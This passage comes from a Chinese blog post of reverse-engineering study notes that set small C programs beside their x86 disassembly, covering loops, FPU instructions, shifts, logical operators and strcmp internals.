class=\"line\">0128107E  |.  8955 F8       mov     [local.2],edx</span><br><span class=\"line\">01281081  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">01281084  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">01281085  |.  68 0C212801   push    0128210C                                  ; |format = &quot;++i%d&quot;</span><br><span class=\"line\">0128108A  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">01281090  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">01281093  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281096  |.  894D F8       mov     [local.2],ecx</span><br><span class=\"line\">01281099  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">0128109C  |.  83EA 01       sub     edx,0x1</span><br><span class=\"line\">0128109F  |.  8955 FC       mov     [local.1],edx</span><br><span class=\"line\">012810A2  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">012810A5  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">012810A6  |.  68 14212801   push    01282114                                  ; |format = &quot;i--%d&quot;</span><br><span class=\"line\">012810AB  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">012810B1  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012810B4  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">012810B7  |.  83E9 01       sub     ecx,0x1</span><br><span class=\"line\">012810BA  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">012810BD  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">012810C0  |.  8955 F8       mov     [local.2],edx</span><br><span class=\"line\">012810C3  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">012810C6  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">012810C7  |.  68 1C212801   push    0128211C                                  ; |format = &quot;--i%d&quot;</span><br><span class=\"line\">012810CC  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">012810D2  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012810D5  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012810D7  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">012810D9  |.  5D            pop     ebp</span><br><span class=\"line\">012810DA  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"do-while\"><a class=\"markdownIt-Anchor\" href=\"#do-while\">#</a> do - while</h4>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = 0;</span><br><span class=\"line\">\tdo</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\twhile (i&lt;=10); </span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>/O2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00071000 &gt;/$  6A 0B         push    0xB                                      ; /&lt;%d&gt; = B (11.)</span><br><span class=\"line\">00071002  |.  68 F4200700   push    000720F4                                 ; |format = &quot;%d&quot;</span><br><span class=\"line\">00071007  |.  FF15 A0200700 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]         ; \\printf</span><br><span class=\"line\">0007100D  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00071010  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00071012  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>禁用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 00251000 &gt;/$  55            push    ebp</span><br><span class=\"line\">&gt; 00251001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">&gt; 00251003  |.  51            push    ecx</span><br><span class=\"line\">&gt; 00251004  |.  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">&gt; 0025100B  |&gt;  8B45 FC       /mov     eax,[local.1]</span><br><span class=\"line\">&gt; 0025100E  |.  83C0 01       |add     eax,0x1</span><br><span class=\"line\">&gt; 00251011  |.  8945 FC       |mov     [local.1],eax</span><br><span class=\"line\">&gt; 00251014  |.  837D FC 0A    |cmp     [local.1],0xA</span><br><span class=\"line\">&gt; 00251018  |.^ 7E F1         \\jle     short 0025100B</span><br><span class=\"line\">&gt; 0025101A  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">&gt; 0025101D  |.  51            push    ecx                                     ; /&lt;%d&gt;</span><br><span class=\"line\">&gt; 0025101E  |.  68 F4202500   push    002520F4                                ; |format = &quot;%d&quot;</span><br><span class=\"line\">&gt; 00251023  |.  FF15 A0202500 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]        ; \\printf</span><br><span class=\"line\">&gt; 00251029  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">&gt; 0025102C  |.  33C0          xor     eax,eax</span><br><span class=\"line\">&gt; 0025102E  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">&gt; 00251030  |.  5D            pop     ebp</span><br><span class=\"line\">&gt; 00251031  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"浮点指令\"><a class=\"markdownIt-Anchor\" href=\"#浮点指令\">#</a> 浮点指令</h4>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tfloat a=8.123f;</span><br><span class=\"line\">\ta++;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">012B1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">012B1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012B1003  |.  51            push    ecx</span><br><span class=\"line\">012B1004  |.  68 F4202B01   push    012B20F4                            ; /format = &quot;shabi&quot;</span><br><span class=\"line\">012B1009  |.  FF15 A0202B01 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]    ; \\printf</span><br><span class=\"line\">012B100F  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">012B1012  |.  D905 08212B01 fld     dword ptr ds:[_real]</span><br><span class=\"line\">012B1018  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012B101B  |.  D945 FC       fld     [local.1]</span><br><span class=\"line\">012B101E  |.  DC05 00212B01 fadd    qword ptr ds:[_real]</span><br><span class=\"line\">012B1024  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012B1027  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B1029  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">012B102B  |.  5D            pop     ebp</span><br><span class=\"line\">012B102C  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>浮点寄存器 - fpu - 浮点运算单元</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120195516311.png\" alt=\"image-20221120195516311\"></p>\n<p>精度为 80 位，10 字节</p>\n<p>MMX - 用于处理多媒体功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120195604566.png\" alt=\"image-20221120195604566\"></p>\n<p>st0 至 st7 80 位的两用寄存器   MMX - FPU</p>\n<p>3.FLD，FSTP，FADD</p>\n<blockquote>\n<ol>\n<li></li>\n</ol>\n<p>fld     dword ptr ds:[_real]     //fld     dword ptr ds:[0x12B2108]</p>\n<p>类似于 push 指令，将数字放入 st 中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120200304416.png\" alt=\"image-20221120200304416\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120200412594.png\" alt=\"image-20221120200412594\"></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>fstp    [local.1]</p>\n<p>类似于 pop 指令，将 st 中的值给 local.1</p>\n<p>调用多次 fld 时，会使用多个 st 寄存器</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>fadd    qword ptr ds:[_real]    //fadd    qword ptr ds:[0x12B2100]</p>\n<p>类似于 add 指令，做加法  qword 64 位，8 各字</p>\n<p>4.fsub</p>\n<p>类似于 sub 指令</p>\n<p>5.fmul</p>\n<p>类似于乘法</p>\n<p>6.fdiv</p>\n<p>类似于除法</p>\n<p>7.FILD 指令</p>\n<p>整数入栈指令，将整数转为浮点数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tfloat a=8.123f;</span><br><span class=\"line\">\tint b = 2;</span><br><span class=\"line\">\ta= a + b;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012F1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">012F1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012F1003  |.  83EC 08       sub     esp,0x8</span><br><span class=\"line\">012F1006  |.  68 F4202F01   push    012F20F4                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">012F100B  |.  FF15 A0202F01 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf</span><br><span class=\"line\">012F1011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">012F1014  |.  D905 FC202F01 fld     dword ptr ds:[_real]</span><br><span class=\"line\">012F101A  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012F101D  |.  C745 F8 02000&gt;mov     [local.2],0x2</span><br><span class=\"line\">012F1024  |.  DB45 F8       fild    [local.2]</span><br><span class=\"line\">012F1027  |.  D845 FC       fadd    [local.1]</span><br><span class=\"line\">012F102A  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012F102D &gt;|.  33C0          xor     eax,eax</span><br><span class=\"line\">012F102F  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">012F1031  |.  5D            pop     ebp</span><br><span class=\"line\">012F1032  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120202918750.png\" alt=\"image-20221120202918750\"></p>\n<p>8.cvttsd2si eax,dword ptr ss:[ebp-4]</p>\n<p>浮点转整数指令，运用截断处理将 mmx/m32 中的一个单精度浮点值转换成 r32 中的一个有符号的双字整数</p>\n</blockquote>\n</blockquote>\n<h4 id=\"位移指令\"><a class=\"markdownIt-Anchor\" href=\"#位移指令\">#</a> 位移指令</h4>\n<blockquote>\n<p>1. 逻辑位移</p>\n<p>shr 逻辑右移指令</p>\n<p>相当于整除 2，用 0 来补位</p>\n<p>shl 逻辑右移指令</p>\n<p>相当于乘 2，用 0 来补位，有可能移除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tunsigned int i = 0x77883322;</span><br><span class=\"line\">\ti = i &gt;&gt; 8;</span><br><span class=\"line\">\ti = i &gt;&gt; 2;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">011D1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">011D1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">011D1003  |.  51            push    ecx</span><br><span class=\"line\">011D1004  |.  68 F4201D01   push    011D20F4                                ; /format = &quot;shabi&quot;</span><br><span class=\"line\">011D1009  |.  FF15 A0201D01 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]        ; \\printf</span><br><span class=\"line\">011D100F  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">011D1012  |.  C745 FC 22330&gt;mov     [local.1],0x3322</span><br><span class=\"line\">011D1019  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">011D101C  |.  C1E8 08       shr     eax,0x8\t\t\t\t\t\t\t\t\t; 0x 00 77 88 33  ÷(2^8)</span><br><span class=\"line\">011D101F  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">011D1022  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">011D1025  |.  C1E9 02       shr     ecx,0x2\t\t\t\t\t\t\t\t\t; ÷ 4</span><br><span class=\"line\">011D1028  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">011D102B  |.  33C0          xor     eax,eax</span><br><span class=\"line\">011D102D  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">011D102F  |.  5D            pop     ebp</span><br><span class=\"line\">011D1030  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>2. 算术位移</p>\n<p>SAR 算术右移指令</p>\n<p>​\tSAR 右移时保留操作数符号，用符号位补</p>\n<p>​\tSHR 右移时用 0 部位</p>\n<p>SAL 算术左移指令</p>\n<p>​\tSAL 与 SHL 功能一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint i = -100000000;</span><br><span class=\"line\">\ti = i &lt;&lt; 5;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);  //1094967296</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3. 循环位移指令</p>\n<p>ROL 循环左移</p>\n<p>ROR 循环右移</p>\n</blockquote>\n<h4 id=\"逻辑运算符\"><a class=\"markdownIt-Anchor\" href=\"#逻辑运算符\">#</a> 逻辑运算符</h4>\n<blockquote>\n<p>逻辑或 ||</p>\n<p>截断原理，如果前面为真，那么不在判断后面的。因此在代码优化层面，把可能性大的放在前面提高效率</p>\n<p>按位或 |</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01321000 &gt;/$  55            push    ebp</span><br><span class=\"line\">01321001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">01321003  |.  83EC 10       sub     esp,0x10</span><br><span class=\"line\">01321006  |.  68 F4203201   push    013220F4                                    ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0132100B  |.  FF15 A0203201 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]            ; \\printf</span><br><span class=\"line\">01321011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">01321014  |.  C745 FC 05000&gt;mov     [local.1],0x5</span><br><span class=\"line\">0132101B  |.  C745 F8 03000&gt;mov     [local.2],0x3</span><br><span class=\"line\">01321022  |.  837D FC 00    cmp     [local.1],0x0</span><br><span class=\"line\">01321026  |.  75 0F         jnz     short 01321037</span><br><span class=\"line\">01321028  |.  837D F8 00    cmp     [local.2],0x0</span><br><span class=\"line\">0132102C  |.  75 09         jnz     short 01321037</span><br><span class=\"line\">0132102E  |.  C745 F0 00000&gt;mov     [local.4],0x0</span><br><span class=\"line\">01321035  |.  EB 07         jmp     short 0132103E</span><br><span class=\"line\">01321037  |&gt;  C745 F0 01000&gt;mov     [local.4],0x1</span><br><span class=\"line\">0132103E  |&gt;  8B45 F0       mov     eax,[local.4]</span><br><span class=\"line\">01321041  |.  8945 F4       mov     [local.3],eax</span><br><span class=\"line\">01321044  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01321046  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">01321048  |.  5D            pop     ebp</span><br><span class=\"line\">01321049  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>逻辑与  &amp;&amp;</p>\n<p>按位与 &amp;</p>\n<p>非运算 ！</p>\n<p>按位取反 ～</p>\n<p>sete al   // 取 ZF 位的值，保存到寄存器中</p>\n<p>setne  al  //zf 取反保存到寄存器中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint a =5,b=4,c,d;</span><br><span class=\"line\"></span><br><span class=\"line\">\tc = !a;</span><br><span class=\"line\">\td = ~b;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FC1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">00FC1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00FC1003  |.  83EC 10       sub     esp,0x10</span><br><span class=\"line\">00FC1006  |.  68 F420FC00   push    00FC20F4                                 ; /format = &quot;shabi&quot;</span><br><span class=\"line\">00FC100B  |.  FF15 A020FC00 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]         ; \\printf</span><br><span class=\"line\">00FC1011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00FC1014  |.  C745 FC 05000&gt;mov     [local.1],0x5</span><br><span class=\"line\">00FC101B  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">00FC1022  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00FC1024  |.  837D FC 00    cmp     [local.1],0x0</span><br><span class=\"line\">00FC1028  |.  0F94C0        sete    al</span><br><span class=\"line\">00FC102B  |.  8945 F0       mov     [local.4],eax</span><br><span class=\"line\">00FC102E  |.  8B4D F8       mov     ecx,[local.2]</span><br><span class=\"line\">00FC1031  |.  F7D1          not     ecx</span><br><span class=\"line\">00FC1033  |.  894D F4       mov     [local.3],ecx</span><br><span class=\"line\">00FC1036  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00FC1038  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00FC103A  |.  5D            pop     ebp</span><br><span class=\"line\">00FC103B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>异或运算</p>\n<p>按位异或 ^</p>\n<p>xor eax,eax   //eax 清零</p>\n<p>可以看成没有进位的加法</p>\n<p>交换 a,b</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = a + b</span><br><span class=\"line\">b = a - b</span><br><span class=\"line\">a = a - b</span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">a = a ^ b</span><br><span class=\"line\">b = a ^ b</span><br><span class=\"line\">a = a ^ b</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"字符操作相关指令\"><a class=\"markdownIt-Anchor\" href=\"#字符操作相关指令\">#</a> 字符操作相关指令</h4>\n<blockquote>\n<p>strcmp</p>\n<p>需要将优化中的启动内部函数设为否，关闭优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00F81000 &gt;/$  55            push    ebp</span><br><span class=\"line\">00F81001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00F81003  |.  83EC 08       sub     esp,0x8</span><br><span class=\"line\">00F81006  |.  68 F420F800   push    00F820F4                               ; /format = &quot;shabi&quot;</span><br><span class=\"line\">00F8100B  |.  FF15 A420F800 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]       ; \\printf</span><br><span class=\"line\">00F81011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00F81014  |.  C745 F8 FC20F&gt;mov     [local.2],00F820FC                     ;  ASCII &quot;123456&quot;</span><br><span class=\"line\">00F8101B  |.  C745 FC 0421F&gt;mov     [local.1],00F82104                     ;  ASCII &quot;shabishabi&quot;</span><br><span class=\"line\">00F81022  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">00F81025  |.  50            push    eax                                    ; /s2</span><br><span class=\"line\">00F81026  |.  8B4D F8       mov     ecx,[local.2]                          ; |</span><br><span class=\"line\">00F81029  |.  51            push    ecx                                    ; |s1</span><br><span class=\"line\">00F8102A  |.  E8 19000000   call    strcmp                                 ; \\strcmp</span><br><span class=\"line\">00F8102F  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00F81032  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00F81034  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00F81036  |.  5D            pop     ebp</span><br><span class=\"line\">00F81037  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>strcmp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">74D6B8E0 &gt;  8B5424 04       mov     edx,dword ptr ss:[esp+0x4]</span><br><span class=\"line\">74D6B8E4    8B4C24 08       mov     ecx,dword ptr ss:[esp+0x8]</span><br><span class=\"line\">74D6B8E8    F7C2 03000000   test    edx,0x3</span><br><span class=\"line\">74D6B8EE    75 3C           jnz     short 74D6B92C</span><br><span class=\"line\">74D6B8F0    8B02            mov     eax,dword ptr ds:[edx]</span><br><span class=\"line\">74D6B8F2    3A01            cmp     al,byte ptr ds:[ecx]</span><br><span class=\"line\">74D6B8F4    75 2E           jnz     short 74D6B924</span><br><span class=\"line\">74D6B8F6    0AC0            or      al,al</span><br><span class=\"line\">74D6B8F8    74 26           je      short 74D6B920</span><br><span class=\"line\">74D6B8FA    3A61 01         cmp     ah,byte ptr ds:[ecx+0x1]</span><br><span class=\"line\">74D6B8FD    75 25           jnz     short 74D6B924</span><br><span class=\"line\">74D6B8FF    0AE4            or      ah,ah</span><br><span class=\"line\">74D6B901    74 1D           je      short 74D6B920</span><br><span 